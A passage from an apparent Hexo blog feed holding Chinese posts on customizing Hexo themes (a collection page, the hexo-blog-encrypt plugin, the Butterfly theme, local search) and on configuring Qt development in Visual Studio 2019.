class=""></p><p>后面的配置不用管。</p><hr><h2 id="10-评论系统修改waline"><a href="#10-评论系统修改waline" class="headerlink" title="10.评论系统修改waline"></a>10.评论系统修改waline</h2><p>因为感觉到valine有点原始，但是胜在配置简单，作者也对其写好了功能，只需要填入id和key即可，但是我个人搜了一下，valine还是存在一些缺点的——具体百度都搜得到不细说了，加上remark42是需要部署在私人服务器上的，我博客都是搭建在github所以更没机会弄。<br>至于步骤不方便教，因为是我自己瞎改的，所以会在所有博客下显示，原本的评论开关就没用了。不符合主题原意，有需要还是等原作者更新吧。</p><hr><h2 id="11-新增收藏页面"><a href="#11-新增收藏页面" class="headerlink" title="11.新增收藏页面"></a>11.新增收藏页面</h2><p style="font-size:14px; text-align:right;">—— 由于收藏界面的样式需求其实跟主题自带的friends页面类似，所以直接套用。</p><p><code>hexo n page collect</code>先创建新页</p><p>然后在<code>source/_data/</code>新建一个collect.json</p><p>json的格式跟friends用的一样的，直接搬过来。</p><p>然后就是显示问题，上述两步操作完之后，主页也没有显示collect<br>需要在<code>_config.yml</code>里面找到<code>aomori_menu:</code>也就是这个主题的菜单，然后照着前面的样子添加即可。</p><p>这一步之后，主页是显示collect菜单了，但是点进去没有内容，原因在于，主题并没有<code>layout: collect</code>这么一个样式，你直接用friends的话内容也是friends.json的内容，所以要去themes目录下找到这个主题目录修改。</p><p>翻了一下，寻找跟已有样式相关的文件夹，首先肯定是找到<code>layout</code>文件夹，然后翻到<code>page</code>下发现了需要的。<code>thems/aomori/layout/_partial/page/</code><br>反正是要抄friends的，就直接新建一个collect.ejs文件，然后copy一下friends的内容。<br>不过仔细看一下代码也会发现一点问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;% site.<span class="property">data</span>.<span class="property">collect</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">items</span>) =&gt;</span> &#123; %&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friends-category&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friends-category-title&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;%= items.category %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friends-category-inner clearfix&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;% items.data.forEach((item) =&gt; &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= item.url %&gt;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;nofollow&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> &lt;%= item.name %&gt; <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;% &#125;) %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;% &#125;) %&gt;</span><br><span class="line"></span><br><span class="line">&lt;% <span class="keyword">if</span> (post.<span class="property">content</span>)&#123; %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">article</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">id</span>=<span class="string">&quot;&lt;%= post.layout %&gt;-&lt;%= post._id %&gt;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">class</span>=<span class="string">&quot;article article-type-&lt;%= post.layout %&gt;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-inner&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-entry post-inner-html&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &lt;%- post.content %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">    </span><br><span class="line">&lt;% <span class="keyword">if</span> (post.<span class="property">comment</span> )&#123; %&gt;</span><br><span class="line">&lt;%- <span class="title function_">partial</span>(<span class="string">&#x27;../post/comments&#x27;</span>) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>首先site.data让我感觉像是取数据用的，然后其它的div的class样式虽然我不知道写在哪了，但是如果改成collect肯定不对的，在基于friends样式的需求下，那么class的东西就不做改动。<br>site.data这里我们修改成collect试一下</p><p>然后看到好像没效果。。。又找了一下，找到<code>themes/layout</code>下有一个page.js<br>里面有一些判断这个layout是否为什么的，那么想必就是关键了，直接copy一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (page.<span class="property">layout</span> === <span class="string">&#x27;friends&#x27;</span>)&#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/$&#123;page.layout&#125;`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page.<span class="property">layout</span> === <span class="string">&#x27;photography&#x27;</span>) &#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/$&#123;page.layout&#125;`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page.<span class="property">layout</span> === <span class="string">&#x27;collect&#x27;</span>) &#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/$&#123;page.layout&#125;`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; <span class="keyword">else</span> &#123; %&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;&lt;%= page.layout %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;%- partial(`_partial/page/default`, &#123;post: page, index: false&#125;) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>如此一来，效果就达到了，而且上面的site.data猜测也是一样的，就是直接导出json里面的数据了，因为把这个换成friends就会发现内容都变成friends.json的内容。</p><p>hhhh。。。虽然对这些ejs什么的学都没学过，就瞎搞了。</p><hr><h2 id="12-对html的补充"><a href="#12-对html的补充" class="headerlink" title="12.对html的补充"></a>12.对html的补充</h2><p>markdown是支持html语法的，说白了还是markdown本身太过草率。<br>在使用html语法之前，要注意主题没有过多修饰，否则有可能不起效。</p><p>为什么要使用html语法就是因为markdown可改性太小</p><img src="/2022/03/20/first-blog/025.png" class=""><p>以此图举例。像<code>&amp;nbsp;</code>其实就是一个半角的空格，是不是半角忘记了，但是你直接在这个主题使用，不知道是主题还是什么问题，它会被自动转换成<code>&amp;ampnbsp;</code>,当然在界面中就是显示<code>&amp;nbsp;</code>原因出在<code>&amp;</code>它被转换了。。。所以不得已使用hteml的p标签圈起来，这样就避免在md转html的时候被转义。<br>像是<code>text-algin</code>这种设置文本对齐的方式对我而言也很有必要，一个合理的排版可以省去阅读的时间。</p><p><strong>此外注意，本主题其他不知，span标签在行内样式中，必须要加上display:block;他才会其效果，否则就是空的</strong></p><p>那么既然要用上html，建议使用者自己浅学一下。</p><blockquote><p>虽然使用html会带来工作量，但是有需要的场景还是可以优化一下的，像我写了这么多，也没几个有排版的哈哈。。。尬住自己</p></blockquote><hr><h2 id="13-新增加密功能"><a href="#13-新增加密功能" class="headerlink" title="13.新增加密功能"></a>13.新增加密功能</h2><p>是来自hexo的插件<code>hexo-blog-encrypt</code></p><ul><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt">github链接</a></li><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">github中文说明</a></li><li><a href="https://mhexo.github.io/">试用Demo</a> 密码都是hello</li></ul><p>应用到博客并不难，根据提示来即可</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li><code>npm install --save hexo-blog-encrypt</code></li><li><code>或 yarn add hexo-blog-encrypt (需要) Yarn)</code></li></ul><p>这里咱用第一种就行了。</p><h3 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h3><p>将 “password” 字段添加到您文章信息头就像这样.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line"><span class="section">password: hello</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>再使用<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s </code>在本地预览加密的文章.</p><p>这个肯定是要先清除重新生成的，不然加密功能打不上</p><h3 id="根据标签加密"><a href="#根据标签加密" class="headerlink" title="根据标签加密"></a>根据标签加密</h3><p>也就是在你的<code>_config.yml</code>下配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="attr">encrypt:</span> <span class="comment"># hexo-blog-encrypt</span></span><br><span class="line">  <span class="attr">abstract:</span> <span class="string">有东西被加密了,</span> <span class="string">请输入密码查看.</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">您好,</span> <span class="string">这里需要密码.</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">tagName</span>, <span class="attr">password:</span> <span class="string">密码A</span>&#125;</span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">tagName</span>, <span class="attr">password:</span> <span class="string">密码B</span>&#125;</span><br><span class="line">  <span class="attr">wrong_pass_message:</span> <span class="string">抱歉,</span> <span class="string">这个密码看着不太对,</span> <span class="string">请再试试.</span></span><br><span class="line">  <span class="attr">wrong_hash_message:</span> <span class="string">抱歉,</span> <span class="string">这个文章不能被校验,</span> <span class="string">不过您还是能看看解密后的内容.</span></span><br></pre></td></tr></table></figure><p>根据tags的名称，依次设置密码。这对要进行大量加密是一件好事。</p><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><p>文章信息头大于按标签加密</p><p>也就是说直接在文章头部设置的优先级大于你在配置文件中对tags的指定</p><h3 id="加密主题"><a href="#加密主题" class="headerlink" title="加密主题"></a>加密主题</h3><p>你可以简单的使用 theme 在 _config.yml 里或者文章头, 如下:</p><p>文章信息头</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">-</span> 作为日记加密</span><br><span class="line">date: 2016-03-30 21:12:21</span><br><span class="line">password: mikemessi</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">theme: xray</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line"><span class="section">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>在 _config.yml<br>示例</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Security</span></span><br><span class="line">encrypt: # hexo-blog-encrypt</span><br><span class="line">  abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">  message: 您好, 这里需要密码.</span><br><span class="line">  tags:</span><br><span class="line"><span class="bullet">  -</span> &#123;name: tagName, password: 密码A&#125;</span><br><span class="line"><span class="bullet">  -</span> &#123;name: tagName, password: 密码B&#125;</span><br><span class="line">  theme: xray</span><br><span class="line">  wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">  wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br></pre></td></tr></table></figure><p>你可以在线挑选你喜欢的主题,并应用到你的博客中:</p><h3 id="操作系数还行"><a href="#操作系数还行" class="headerlink" title="操作系数还行"></a>操作系数还行</h3><p>剩下的需要自己摸索<br>我没访问过源码不知道，但是优点是禁用js后不会失效，所以原理不晓得是啥。</p><p>至于为什么加密，总归要有一些个人隐私吧。</p><hr><h2 id="13-整理文章"><a href="#13-整理文章" class="headerlink" title="13.整理文章"></a>13.整理文章</h2><p>额，怎么说呢，养成良好的排版习惯是挺重要的，以免将来翻阅都是个问题。<br>起初我只考虑到价格tag标记，但是写的杂了，tag太乱了没有必要。<br>后面又加入categories，做大的整理，tag用于小标记。虽然不能完全整治。</p><p>最后还有一个问题，最初以为文件起中文名字渲染会不太友好，所以都是机翻创建的文件，这个导致的问题就是我想要重新编辑的时候工作量太大。现在是悔恨晚已。</p><p>为了照顾自己，也为了以后读者考虑，还是在一级标题上加上【】标注下范围，至于tag和categories也还是保留吧。</p><blockquote><p>ps:这几天翻阅之前写的文章哈哈哈哈，还是感觉毫无章法，有的甚至写完自己都忘了。。</p></blockquote><hr><h2 id="14-水印"><a href="#14-水印" class="headerlink" title="14.水印"></a>14.水印</h2><p>参考<a href="https://blog.csdn.net/weixin_42088811/article/details/103636568">文章</a><br>原<a href="https://github.com/SpiritLing/hexo-images-watermark">GitHub地址</a></p><p>博主自己写了个插件。具体使用不知道会不会和主题之间有差异。</p><p>如果npm下载速度很慢，可以尝试设置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//配置nmp代理来提高速度，如设置淘宝镜像</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org </span><br><span class="line"></span><br><span class="line">//查看配置是否成功</span><br><span class="line">npm config get registry </span><br><span class="line"></span><br><span class="line">//成功后重新npm install安装</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><blockquote><p>经过我测试，和理解，貌似是因为我修改过一个东西，就是创建一篇文章就会创建一个这个名字的文件夹，然后我把图片放进去，但是作者所谓的通配这些图片格式是在<code>source/_posts</code>下的，而我这种做法则多了一个文件夹，不知道是不是这个问题导致的没有效果</p></blockquote><hr><h1 id="Butterfly"><a href="#Butterfly" class="headerlink" title="Butterfly"></a>Butterfly</h1><ul><li><a href="https://butterfly.js.org/">demo展示</a></li><li><a href="https://github.com/jerryc127/hexo-theme-butterfly">github</a></li><li><a href="https://butterfly.js.org/posts/dc584b87/#Page-Front-matter">页面配置信息</a></li><li><a href="https://butterfly.js.org/posts/4aa8abbe/">主题配置1</a></li><li><a href="https://butterfly.js.org/posts/ceeb73f/">主题配置2</a></li></ul><p>原主题虽然精简干练，但是文章多了之后左边的tag太杂乱了不利于以后的发展。<br>详细的内容配置作者介绍的很好了，有兴趣的可以自行尝试。<br>另外网上也有魔改的，都挺厉害的哈哈</p><ul><li><a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">随机找的</a></li></ul><blockquote><p>大部分功能还是能转移的，其余的要看情况了。</p></blockquote><hr><h2 id="收藏界面"><a href="#收藏界面" class="headerlink" title="收藏界面"></a>收藏界面</h2><p>效果跟友情链接大差不差，所以可以直接嵌套<br>我这猪脑子还照着flink相关的文件copy一份修改，但是一直报错。<br>而且一开始也没理解文档的意思，后面明白了</p><p>你只需要<code>hexo n page xxx</code><br>然后在这个index.md下面填上这个所谓的<code>标签外挂</code>，它会自动用link方式解析你里面的数据。省得你开个yml。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% flink %&#125;</span><br><span class="line">- class_name: 微软</span><br><span class="line">  class_desc: windows</span><br><span class="line">  link_list:</span><br><span class="line">    - name: 微软开发文档</span><br><span class="line">      url: https://docs.microsoft.com/zh-cn/</span><br><span class="line">      avatar: </span><br><span class="line">      descr: </span><br><span class="line">    - name: MFC类层次结构图</span><br><span class="line">      link: https://docs.microsoft.com/zh-cn/cpp/mfc/hierarchy-chart?view=2022</span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br><span class="line">- class_name: c/c++   </span><br><span class="line">  class_desc: C++</span><br><span class="line">  link_list:</span><br><span class="line">    - name: 数据结构和算法动态可视化</span><br><span class="line">      url: https://visualgo.net/zh</span><br><span class="line">      avatar: </span><br><span class="line">      descr: </span><br><span class="line">    - name: cpp参考文档</span><br><span class="line">      url: https://en.cppreference.com/w/</span><br><span class="line">      avatar: </span><br><span class="line">      descr: </span><br><span class="line"></span><br><span class="line">&#123;% endflink %&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h2><p><code>npm install hexo-generator-search --save</code><br>先安装这个。</p><p>然后去yml里面把local search开起来</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Local search 本地搜索</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line">    <span class="attr">hits_empty:</span> <span class="string">&quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot;</span> <span class="comment"># 如果没有查到内容相关内容显示</span></span><br></pre></td></tr></table></figure><blockquote><p>目前不知道和algolia有什么区别，但是本地建立索引应该比挂在外面然后获取好吧？就是索引占用大小不知道了。</p></blockquote><hr><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>有个小问题就是这个主题他会在TOC自动排序你md的标题等级，而我以前用的那个是不会的，所以我以前都是手动添加的，现在换主题老的文章就变成嵌套版了。</p><hr><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><h3 id="一篇文章如何设置多个tags"><a href="#一篇文章如何设置多个tags" class="headerlink" title="一篇文章如何设置多个tags"></a>一篇文章如何设置多个tags</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tags: </span><br><span class="line"><span class="bullet">    -</span> tags1</span><br><span class="line"><span class="bullet">    -</span> tags2</span><br></pre></td></tr></table></figure><p>即可</p><p>其他的属性也有可能能这么设置，可以自行尝试</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><del>花了点时间自己做了下调整，有空去把评论功能加上，毕竟比较骚气。</del><br><del>还有就是域名绑定问题，暂时没这个钱，都是通过username.github.io访问的，github都知道会被墙，响应速度不好说。如果你担心这个问题，可以去百度用gitee搭建的博客，码云是国内的服务器，响应会比github快点。</del></p><p>上述操作均为自己尝试过的，不同环境可能会产生差异，欢迎评论交流。</p>]]></content>
      
      
      <categories>
          
          <category> blog_Index </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vs配置qt开发</title>
      <link href="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/"/>
      <url>/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>qt的creator真的是一言难尽，都发展这么多年了居然还是这个样子，对于高分辨率的机子，软件的大小适配真的不舒服，文字也一样，有的能适配，有的不行。官方也没给个解决的办法。</p><span id="more"></span><p>其次就是字符集和智能提示什么的，太差了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>不过也是闲着无聊，还特意搜过用vs或者clion如何创建qt。<br>clion的话稍微麻烦点，因为qt下载的编译器里面，除了mingw就是msvc。</p><blockquote><p>windows按照vs的来，c&#x2F;cpp一般就是msvc，当然也可以通过mingw下载gcc&#x2F;g++<br>linux则是纯gcc&#x2F;g++<br>mac则是clang<br>三者由于都不相同，所以在支持的语法和特性上也有会差异</p></blockquote><ol><li>操作系统win10</li><li>软件vs2019——<a href="https://visualstudio.microsoft.com/zh-hans/vs/">下载</a></li><li>qt版本随意一般问题不大，注意我们下载的是开源学习用的，商用是要付费的<ol><li>vs2015匹配的大概是 Qt5.7、5.9、5.6这些</li><li>vs2017匹配的大概是 Qt5.9——Qt5.14</li><li>vs2019匹配的大概是 Qt5.14——Qt6</li><li>最好是选偶数版本，奇数好像有点小问题</li><li><a href="https://download.qt.io/archive/qt/">下载地址</a>，选择exe，提示登录就断网跳过那步</li></ol></li></ol><p>配置起来其实很简单</p><hr><h2 id="拓展安装"><a href="#拓展安装" class="headerlink" title="拓展安装"></a>拓展安装</h2><p>首先先去下载vs的qt拓展，默认下载有点慢，可以去网页上<a href="https://marketplace.visualstudio.com/">下载地址</a><br>搜索qt，就能看到了，注意看简介，有说明是2015还是2017还是2019的。不和自己的vs匹配装不了。</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/004.png" class=""><p>下载完成后，请先关闭vs，然后执行那个拓展安装，静候下载。</p><p>完成后，可以在vs的拓展里看到<code>Qt vs tools</code>。说明拓展安装成功。<br>打开这个选项，需要配置一下qmake的路径</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/000.png" class=""><p>这里你主要是记住qt安装的目录，可以通过箭头这个文件夹打开，找到你qt安装的目录下的版本下的msvc，他有一个64和稍微短一点的那个是86的，然后选择bin目录，选择qmake。两个版本都添加一遍就行。</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/001.png" class=""><p>添加完成后选择qt widgets application项目模板创建项目。其他的路数跟你qt正常创建是一样的，完成后可以跑一下，能弹出窗口就行了。</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/005.png" class=""><hr><h2 id="ui文件打开闪退"><a href="#ui文件打开闪退" class="headerlink" title="ui文件打开闪退"></a>ui文件打开闪退</h2><p>然后是打开那个ui文件过一会就报错的问题，那个Qt Designer默认是不允许在分离窗口运行的原因吧<br>我们可以通过选择options</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/003.png" class=""><p>然后把这个选项设置为true</p><img src="/2021/11/01/vs%E9%85%8D%E7%BD%AEqt%E5%BC%80%E5%8F%91/002.png" class=""><p>那么qt设计师那个窗口就不会报错了。</p><hr><h2 id="缺少dll"><a href="#缺少dll" class="headerlink" title="缺少dll"></a>缺少dll</h2><p>这个还真不好说，有些人一开始可能没遇到后面遇到了，建议就是把你使用的qt的msvc的bin目录，添加到系统坏境中。然后重启下电脑才生效。【以后对clion配置也有好处哈哈】</p><ol><li>右击此电脑-属性</li><li>跳到设置-关于之后往下滑，有一个高级系统设置</li><li>打开之后右下角有一个环境变量</li><li>打开后看到下面的系统变量，找到path，双击，选择新建</li><li>把刚才说的qt的msvc的bin目录复制下来，添加，注意64和86都放进去得了</li></ol><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实qt本身也因为比较单调和简略，对于内存还是速度一定程序上比vs是快点。</p><p>最后就是用vs创建的qt是以qmake编译的，qt默认是cmake。我目前还不知道有什么太大区别，先自己用的舒服点吧，以后上班了什么的在看公司要求。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>qt翻金币小游戏</title>
      <link href="/2021/09/26/qt%E7%BF%BB%E9%87%91%E5%B8%81%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
      <url>/2021/09/26/qt%E7%BF%BB%E9%87%91%E5%B8%81%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
      
